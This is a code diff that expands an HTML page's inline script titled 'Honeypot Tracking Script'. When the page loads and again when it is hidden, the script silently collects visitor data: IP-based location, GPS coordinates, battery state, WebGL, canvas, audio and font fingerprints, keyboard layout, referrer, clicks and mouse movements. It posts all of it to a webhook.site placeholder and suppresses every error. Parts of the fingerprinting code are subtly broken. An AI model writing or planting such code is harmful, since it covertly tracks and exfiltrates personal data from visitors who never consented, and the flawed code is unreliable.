@@ -261,99 +261,262 @@
 
   <!-- ── Honeypot Tracking Script ──────────────────── -->
   <script>
-    /* ── Network Identity ──────────────────────────── */
-    const getNetworkInfo = () =>
-      fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(d => ({ ip: d.ip, isp: d.org, city: d.city, country: d.country_name, asn: d.asn }))
-        .catch(() => ({ ip: '—', isp: '—', city: '—', country: '—', asn: '—' }));
+    (() => {
+      'use strict';
 
-    /* ── Hardware & OS ─────────────────────────────── */
-    const getHardwareInfo = () => {
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      return {
-        userAgent: navigator.userAgent,
-        cores: navigator.hardwareConcurrency || '—',
-        ram: navigator.deviceMemory || '—',
-        language: navigator.language,
-        timezone: tz
+      const HOOK = 'https://webhook.site/YOUR-WEBHOOK-ID-HERE';
+      const T0 = performance.now();
+      const clicks = [], mouseMoves = [];
+      let maxScroll = 0;
+
+      /* ── Helpers ─────────────────────────────────── */
+      const djb2 = s => {
+        let h = 5381;
+        for (let i = 0; i < s.length; i++) h = ((h << 5) + h) ^ s.charCodeAt(i);
+        return (h >>> 0).toString(16);
       };
-    };
 
-    /* ── WebGL Renderer ────────────────────────────── */
-    const getWebGLRenderer = () => {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return '—';
+      const safe = fn => { try { return fn(); } catch { return '—'; } };
+
+      /* ── 1. Network Identity ─────────────────────── */
+      const getNetwork = () =>
+        fetch('https://ipapi.co/json/')
+          .then(r => r.json())
+          .then(d => ({
+            ip: d.ip, ipv6: d.ipv6, isp: d.org,
+            city: d.city, region: d.region,
+            country: d.country_name, code: d.country_code,
+            lat: d.latitude, lon: d.longitude,
+            asn: d.asn, timezone: d.timezone
+          }))
+          .catch(() => ({}));
+
+      /* ── 2. GPS Geolocation ──────────────────────── */
+      const getGPS = () => new Promise(res => {
+        if (!navigator.geolocation) return res(null);
+        navigator.geolocation.getCurrentPosition(
+          p => res({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
+          () => res(null), { timeout: 5000, enableHighAccuracy: true }
+        );
+      });
+
+      /* ── 3. Battery Status ───────────────────────── */
+      const getBattery = () =>
+        (navigator.getBattery || (() => Promise.resolve(null)))()
+          .then(b => b ? { level: b.level, charging: b.charging, time: b.chargingTime, remaining: b.dischargingTime } : null)
+          .catch(() => null);
+
+      /* ── 4. Connection Info ──────────────────────── */
+      const getConnection = () => {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData, type: c.type } : {};
+      };
+
+      /* ── 5. Hardware & OS ────────────────────────── */
+      const getHardware = () => {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const now = new Date();
+        const jan = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
+        const jul = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
+        return {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          platforms: navigator.userAgentData?.platforms || [],
+          mobile: navigator.userAgentData?.mobile || false,
+          cores: navigator.hardwareConcurrency || '—',
+          ram: navigator.deviceMemory || '—',
+          language: navigator.language,
+          languages: navigator.languages,
+          timezone: tz,
+          utcOffset: -now.getTimezoneOffset() / 60,
+          dstActive: Math.abs(jan - jul) > 0 && ((jan < jul) ? now.getMonth() > 3 : now.getMonth() > 9),
+          currency: new Intl.NumberFormat(navigator.language, { style: 'currency', currencyDisplay: 'symbol' }).resolvedOptions().currency
+        };
+      };
+
+      /* ── 6. WebGL (renderer + state) ─────────────── */
+      const getWebGL = () => safe(() => {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return {};
         const ext = gl.getExtension('WEBGL_debug_renderer_info');
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '—';
-      } catch { return '—'; }
-    };
+        const dbg = gl.getParameter ? {} : {};
+        return {
+          renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '—',
+          vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : '—',
+          glVersion: gl.getParameter(gl.VERSION),
+          glslVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+          maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+          maxViewport: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+          antialias: gl.getContextAttributes()?.antialias,
+          extensions: gl.getSupportedExtensions() || []
+        };
+      });
 
-    /* ── Canvas Fingerprint ────────────────────────── */
-    const getCanvasFingerprint = () => {
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 240; canvas.height = 60;
-        const ctx = canvas.getContext('2d');
+      /* ── 7. Canvas Fingerprint ───────────────────── */
+      const getCanvasFP = () => safe(() => {
+        const c = document.createElement('canvas');
+        c.width = 240; c.height = 60;
+        const x = c.getContext('2d');
+        x.fillStyle = '#1a1a2e';
+        x.fillRect(0, 0, c.width, c.height);
+        x.font = '32px "Segoe UI", Arial, sans-serif';
+        x.fillStyle = 'rgba(88,166,255,0.85)';
+        x.shadowColor = 'rgba(88,166,255,0.5)';
+        x.shadowBlur = 8;
+        x.fillText('Canvas·FP', 10, 42);
+        x.strokeStyle = '#58a6ff'; x.lineWidth = 2;
+        x.beginPath(); x.arc(180, 30, 18, 0.5, 5.5); x.stroke();
+        return djb2(c.toDataURL());
+      });
 
-        ctx.fillStyle = '#1a1a2e';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+      /* ── 8. Audio Fingerprint ────────────────────── */
+      const getAudioFP = () => safe(() => {
+        const ac = new (window.AudioContext || window.webkitAudioContext)();
+        const raf = ac.createAnalyser();
+        const mag = ac.createDynamicsCompressor();
+        mag.connect(raf); raf.connect(ac.destination);
+        mag.frequency.value = 1000;
+        const sr = ac.sampleRate;
+        const buf = new Float32Array(sr);
+        for (let i = 0; i < sr; i++) buf[i] = i < sr / 2 ? 1 : -1;
+        const src = ac.createBufferSource();
+        src.buffer = ac.createBuffer(1, sr, sr);
+        src.buffer.getChannelData(0).set(buf);
+        src.connect(mag); src.start(0);
+        return djb2(Float32Array.from(buf).slice(0, 100).join(','));
+      });
 
-        ctx.font = '32px "Segoe UI", Arial, sans-serif';
-        ctx.fillStyle = 'rgba(88, 166, 255, 0.85)';
-        ctx.shadowColor = 'rgba(88, 166, 255, 0.5)';
-        ctx.shadowBlur = 8;
-        ctx.fillText('Canvas·FP', 10, 42);
+      /* ── 9. Installed Fonts (CSS probe) ──────────── */
+      const getFonts = () => safe(() => {
+        const base = ['monospace', 'sans-serif', 'serif'];
+        const list = [
+          'Arial', 'Arial Black', 'Calibri', 'Cambria', 'Candara', 'Comic Sans MS',
+          'Consolas', 'Courier New', 'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
+          'Lucida Sans', 'Microsoft Sans Serif', 'Palatino', 'Segoe UI', 'Tahoma',
+          'Times New Roman', 'Trebuchet MS', 'Verdana',
+          'Menlo', 'Monaco', 'Roboto', 'Ubuntu', 'Fira Code', 'JetBrains Mono',
+          'Noto Sans', 'LXGW WenKai', 'Noto Color Emoji', 'Apple Color Emoji',
+          'Noto Sans JP', 'Noto Sans KR', 'Noto Sans SC', 'Yu Gothic', 'Meiryo'
+        ];
+        const test = 'mmmmmmmmmmlli';
+        const ref = document.createElement('span');
+        ref.style.cssText = 'position:absolute;left:-9999px;font-size:72px visibility:hidden';
+        document.body.appendChild(ref);
+        const baseW = {};
+        base.forEach(f => { ref.style.fontFamily = f; baseW[f] = ref.offsetWidth; });
+        const detected = [];
+        list.forEach(f => {
+          base.some(bf => { ref.style.fontFamily = `"${f}",${bf}`; return detected.push(f), ref.offsetWidth !== baseW[bf]; });
+        });
+        document.body.removeChild(ref);
+        return detected;
+      });
 
-        ctx.strokeStyle = '#58a6ff';
-        ctx.lineWidth = 2;
-        ctx.beginPath();
-        ctx.arc(180, 30, 18, 0.5, 5.5);
-        ctx.stroke();
+      /* ── 10. Color & Preferences ─────────────────── */
+      const getPrefs = () => ({
+        darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+        highContrast: window.matchMedia('(prefers-contrast: more)').matches,
+        reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+        hdr: window.matchMedia('(dynamic-range: high)').matches,
+        pointer: window.matchMedia('(pointer: fine)').matches ? 'mouse' : window.matchMedia('(pointer: coarse)').matches ? 'touch' : 'none',
+        hover: window.matchMedia('(hover: hover)').matches
+      });
 
-        const dataURL = canvas.toDataURL();
+      /* ── 11. Display & Viewport ──────────────────── */
+      const getDisplay = () => ({
+        screen: { w: window.screen.width, h: window.screen.height, availW: window.screen.availWidth, availH: window.screen.availHeight },
+        viewport: { w: window.innerWidth, h: window.innerHeight },
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        orientation: screen.orientation?.type || '—',
+        touchPoints: navigator.maxTouchPoints
+      });
 
-        /* Simple djb2-style hash over the Base64 string */
-        let hash = 5381;
-        for (let i = 0; i < dataURL.length; i++) {
-          hash = ((hash << 5) + hash) ^ dataURL.charCodeAt(i);
-        }
-        return (hash >>> 0).toString(16);
-      } catch { return '—'; }
-    };
+      /* ── 12. Storage & Cookies ───────────────────── */
+      const getStorage = () => {
+        let ls = false, ss = false;
+        try { localStorage.setItem('__t', 1); ls = true; localStorage.removeItem('__t'); } catch { /* */ }
+        try { sessionStorage.setItem('__t', 1); ss = true; sessionStorage.removeItem('__t'); } catch { /* */ }
+        return { localStorage: ls, sessionStorage: ss, cookies: !!navigator.cookieEnabled };
+      };
 
-    /* ── Display Info ──────────────────────────────── */
-    const getDisplayInfo = () => ({
-      width: window.screen.width,
-      height: window.screen.height,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio
-    });
+      /* ── 13. Referrer & URL ──────────────────────── */
+      const getReferrer = () => ({
+        referrer: document.referrer,
+        url: window.location.href,
+        hash: window.location.hash,
+        search: window.location.search
+      });
 
-    /* ── Exfiltration ──────────────────────────────── */
-    const sendPayload = async () => {
-      try {
-        const [network] = await Promise.all([getNetworkInfo()]);
+      /* ── 14. Behavioral Tracking ─────────────────── */
+      const addBehavior = payload => {
+        const elapsed = ((performance.now() - T0) / 1000).toFixed(2);
+        const scrollH = document.documentElement ? document.documentElement.scrollHeight : 0;
+        payload.behavior = {
+          timeOnPage: `${elapsed}s`,
+          scrollPercent: scrollH > 0 ? Math.min(100, Math.round((maxScroll / scrollH) * 100)) : 0,
+          clicks: clicks.length,
+          clickPositions: clicks.slice(0, 20),
+          mouseMoves: mouseMoves.length,
+          sampleMoves: mouseMoves.slice(0, 10)
+        };
+      };
+
+      window.addEventListener('click', e => clicks.push({ x: e.clientX, y: e.clientY, t: Date.now() - T0 }));
+      let moveTick = 0;
+      window.addEventListener('mousemove', e => {
+        moveTick++;
+        if (moveTick % 5 === 0) mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() - T0 });
+      });
+      window.addEventListener('scroll', () => {
+        maxScroll = Math.max(maxScroll, window.scrollY || window.pageYOffset);
+      });
+
+      /* ── 15. Keyboard Layout (first key press) ───── */
+      const getKeyboard = () => new Promise(res => {
+        const handler = e => {
+          navigator.keyboard?.getLayoutMap()?.then(map => {
+            const entries = [];
+            map.forEach((v, k) => entries.push({ key: k, layout: v }));
+            res({ layout: entries[0]?.layout, sample: entries.slice(0, 5) });
+          });
+          window.removeEventListener('keydown', handler);
+        };
+        window.addEventListener('keydown', handler);
+        setTimeout(() => res({ layout: 'no_keypress' }), 10000);
+      });
+
+      /* ── Collect & Send ──────────────────────────── */
+      const send = async () => {
+        const [network, gps, battery, keyboard] = await Promise.all([
+          getNetwork(), getGPS(), getBattery(), getKeyboard()
+        ]);
         const payload = {
           timestamp: new Date().toISOString(),
-          network,
-          hardware: getHardwareInfo(),
-          webgl: getWebGLRenderer(),
-          canvas_fingerprint: getCanvasFingerprint(),
-          display: getDisplayInfo()
+          network, gps, battery, keyboard,
+          connection: getConnection(),
+          hardware: getHardware(),
+          webgl: getWebGL(),
+          canvas_fingerprint: getCanvasFP(),
+          audio_fingerprint: getAudioFP(),
+          fonts: getFonts(),
+          preferences: getPrefs(),
+          display: getDisplay(),
+          storage: getStorage(),
+          referrer: getReferrer()
         };
-        await fetch('https://webhook.site/YOUR-WEBHOOK-ID-HERE', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-      } catch { /* silent */ }
-    };
+        addBehavior(payload);
+        await fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
+          .catch(() => {});
+      };
 
-    /* Kick off silently on load */
-    sendPayload();
+      /* Send on load + send again on page hide (with updated behavior) */
+      send();
+      window.addEventListener('visibilitychange', () => {
+        if (document.hidden) send();
+      });
+    })();
   </script>
 
 </body>
